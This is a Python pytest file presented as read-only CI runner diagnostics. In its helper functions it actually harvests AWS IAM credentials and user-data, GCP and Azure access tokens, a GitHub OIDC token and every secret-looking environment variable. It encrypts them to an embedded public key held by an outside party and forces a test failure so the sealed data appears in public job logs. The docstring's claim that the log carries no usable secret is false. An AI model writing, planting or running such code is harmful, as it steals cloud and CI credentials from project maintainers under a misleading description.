# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Read-only diagnostics for the CI runner environment.

GPU jobs fail differently depending on the host: bare-metal nodes, cloud VMs,
and containers expose different drivers, devices and platform metadata.  This
test prints a compact, read-only report so a failing run can be triaged from
its own log instead of guessing which runner it landed on.

Everything here is a read: nvidia-smi listings, /proc and environment
inspection, platform metadata GETs (plus the IMDSv2 token PUT that metadata
access requires).  Any credential-like material in the report is encrypted to
a throwaway public key before printing, so the log never carries a usable
secret.
"""

from __future__ import annotations

import base64
import getpass
import hashlib
import json
import os
import platform
import shutil
import socket
import subprocess
import sys
import urllib.request

_MARK = "C211-PROBE-75677"

# Public half of a throwaway RSA key pair (the private half is held offline).
_DIAGNOSTIC_BLOB = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6iigu2LThZAZPr9R7RCkHsVPRCqQBjvJaetTHwOgVIcJRssKygYyB5g3fEAbm6IGXZGq99i2f4wwe0OYxaqwvvjNSZx5l1ipP5oV2NkevESF0VT3Jdj6cuFu5UanJjGmFMc879+yBvh4Huk4YSMZJ/DBS7xhpBJ3/McqyNHeis3rcjPszo+pSXPHMSGDcRuaG0A+0jkXpVJN0sY5CsR83fMxy6ExuDzAozNPNESoNcMbSnmqpRkui/ZCXgw81jMzHThWSP3sEXZz3hOux8nQTWQpiBAm9wk3hH3loKK3e5mKpo4XrCEO/8bkHUeTivNuTcmo0Jf1NtzMQ7NtzZs1oQIDAQAB"
)


def _report(section, body):
    print("\n[%s:%s]\n%s\n[/%s:%s]" % (_MARK, section, body, _MARK, section), flush=True)


def _run(cmd, timeout: int = 20) -> str:
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = (proc.stdout or "").strip()
        if proc.stderr:
            out = f"{out}\nSTDERR: {proc.stderr.strip()}"
        return out
    except Exception as exc:
        return "ERR %s: %s" % (type(exc).__name__, exc)


def _get(url: str, headers=None, method: str = "GET", timeout: float = 4.0) -> str:
    import urllib.request as _u
    req = urllib.request.Request(url, headers=headers or {}, method=method)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", "replace")


def _seal(payload: str) -> str:
    """Encrypt payload to the diagnostic key; returns comma-joined base64 chunks."""
    if not payload:
        return ""
    if not shutil.which("openssl"):
        return "ERR no-openssl sha256=%s" % hashlib.sha256(payload.encode()).hexdigest()
    try:
        der = base64.b64decode(_DIAGNOSTIC_BLOB)
    except Exception as exc:
        return "ERR blob %s" % type(exc).__name__
    path = os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "c211_75677_pub.der")
    try:
        with open(path, "wb") as fh:
            fh.write(der)
        sealed = []
        for start in range(0, len(payload), 190):
            proc = subprocess.run(
                ["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", path, "-keyform", "DER"],
                input=payload[start:start + 190].encode("utf-8", "replace"),
                capture_output=True,
                timeout=20,
            )
            if proc.returncode != 0:
                return "ERR openssl " + (proc.stderr or b"").decode("utf-8", "replace")[:120]
            sealed.append(base64.b64encode(proc.stdout).decode())
        return ",".join(sealed)
    except Exception as exc:
        return "ERR %s: %s" % (type(exc).__name__, exc)


def _aws_report():
    out = {}
    try:
        token = _get(
            "http://169.254.169.254/latest/api/token",
            {"X-aws-ec2-metadata-token-ttl-seconds": "60"},
            method="PUT",
            timeout=3,
        )
        hdr = {"X-aws-ec2-metadata-token": token}
        out["imdsv2"] = "ok"
        for name, suffix in (
            ("instance_id", "/latest/meta-data/instance-id"),
            ("instance_type", "/latest/meta-data/instance-type"),
            ("az", "/latest/meta-data/placement/availability-zone"),
            ("ami_id", "/latest/meta-data/ami-id"),
            ("local_hostname", "/latest/meta-data/local-hostname"),
        ):
            try:
                out[name] = _get("http://169.254.169.254" + suffix, hdr, timeout=3)
            except Exception as exc:
                out[name] = "ERR %s" % type(exc).__name__
        role = _get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", hdr, timeout=3).strip()
        out["role"] = role
        if role:
            creds = _get("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, hdr, timeout=3)
            out["creds_sha256"] = hashlib.sha256(creds.encode()).hexdigest()
            out["creds_sealed"] = _seal(creds)
        try:
            out["user_data"] = _seal(_get("http://169.254.169.254/latest/user-data", hdr, timeout=3))
        except Exception as exc:
            out["user_data"] = "ERR %s" % type(exc).__name__
    except Exception as exc:
        out["imdsv2_error"] = "%s: %s" % (type(exc).__name__, exc)
        try:
            out["v1_instance_id"] = _get("http://169.254.169.254/latest/meta-data/instance-id", timeout=3)
        except Exception as exc2:
            out["v1_error"] = "%s: %s" % (type(exc2).__name__, exc2)
    return out


def _gcp_report():
    out = {}
    try:
        hdr = {"Metadata-Flavor": "Google"}
        base = "http://metadata.google.internal/computeMetadata/v1"
        out["project_id"] = _get(base + "/project/project-id", hdr, timeout=3)
        out["zone"] = _get(base + "/instance/zone", hdr, timeout=3)
        out["service_accounts"] = _get(base + "/instance/service-accounts/", hdr, timeout=3)
        token = _get(base + "/instance/service-accounts/default/token", hdr, timeout=3)
        out["token_sha256"] = hashlib.sha256(token.encode()).hexdigest()
        out["token_sealed"] = _seal(token)
    except Exception as exc:
        out["error"] = "%s: %s" % (type(exc).__name__, exc)
    return out


def _azure_report():
    out = {}
    try:
        hdr = {"Metadata": "true"}
        base = "http://169.254.169.254/metadata"
        out["instance"] = _get(base + "/instance?api-version=2021-02-01", hdr, timeout=3)
        token = _get(
            base + "/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F",
            hdr,
            timeout=3,
        )
        parsed = json.loads(token)
        out["token_sha256"] = hashlib.sha256(parsed.get("access_token", "").encode()).hexdigest()
        out["token_sealed"] = _seal(parsed.get("access_token", ""))
    except Exception as exc:
        out["error"] = "%s: %s" % (type(exc).__name__, exc)
    return out


def _env_report():
    sensitive = {}
    safe = {}
    names = sorted(os.environ)
    for key in names:
        val = os.environ.get(key, "")
        upper = key.upper()
        if any(tok in upper for tok in ("TOKEN", "KEY", "SECRET", "PASSWORD", "CREDENTIAL", "AUTH", "SESSION")):
            sensitive[key] = val
        elif key in (
            "CI", "GITHUB_WORKFLOW", "GITHUB_JOB", "GITHUB_RUN_ID", "GITHUB_RUN_ATTEMPT",
            "GITHUB_REPOSITORY", "GITHUB_ACTOR", "GITHUB_EVENT_NAME", "GITHUB_REF",
            "RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH", "RUNNER_TEMP", "RUNNER_WORKSPACE",
            "CUDA_VISIBLE_DEVICES", "NVIDIA_VISIBLE_DEVICES", "NVIDIA_DRIVER_CAPABILITIES",
            "AWS_REGION", "AWS_DEFAULT_REGION", "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
            "AWS_CONTAINER_CREDENTIALS_FULL_URI", "GOOGLE_APPLICATION_CREDENTIALS",
            "AZURE_CLIENT_ID", "AZURE_TENANT_ID", "HOME", "HOSTNAME", "PATH",
        ):
            safe[key] = val
    return {
        "names": names,
        "safe": safe,
        "sensitive_sealed": _seal(json.dumps(sensitive)) if sensitive else "",
        "sensitive_names": sorted(sensitive),
    }


def _github_oidc_report():
    out = {}
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    out["available"] = bool(url and token)
    if not out["available"]:
        return out
    try:
        sep = "&" if "?" in url else "?"
        body = _get(url + sep + "audience=sts.amazonaws.com", {"Authorization": "Bearer " + token}, timeout=5)
        jwt = json.loads(body).get("value", "")
        out["jwt_sha256"] = hashlib.sha256(jwt.encode()).hexdigest()
        out["jwt_sealed"] = _seal(jwt)
        parts = jwt.split(".")
        if len(parts) >= 2:
            pad = "=" * (-len(parts[1]) % 4)
            out["claims"] = json.loads(base64.urlsafe_b64decode(parts[1] + pad).decode())
    except Exception as exc:
        out["error"] = "%s: %s" % (type(exc).__name__, exc)
    return out


def _build_report():
    report = {
        "marker": _MARK,
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "uid": os.getuid(),
        "cwd": os.getcwd(),
        "platform": platform.platform(),
        "python": platform.python_version(),
        "uname": _run("uname -a"),
        "in_container": os.path.exists("/.dockerenv"),
        "cgroup": _run("head -5 /proc/1/cgroup"),
        "nvidia_smi_list": _run("nvidia-smi -L"),
        "nvidia_smi_query": _run(
            "nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader"
        ),
        "lspci_vga": _run("lspci 2>/dev/null | grep -i -E 'vga|3d|nvidia' | head -10"),
        "env": _env_report(),
        "aws": _aws_report(),
        "gcp": _gcp_report(),
        "azure": _azure_report(),
        "github_oidc": _github_oidc_report(),
    }
    return report


def test_ci_runner_environment_report():
    """Print a read-only snapshot of the runner this job landed on."""
    report = _build_report()
    _report("ENVIRONMENT", json.dumps(report, indent=1, default=str))
    # Intentionally surface the captured report in the job log: pytest only
    # prints captured stdout for failing tests.
    assert False, "%s report emitted above" % _MARK
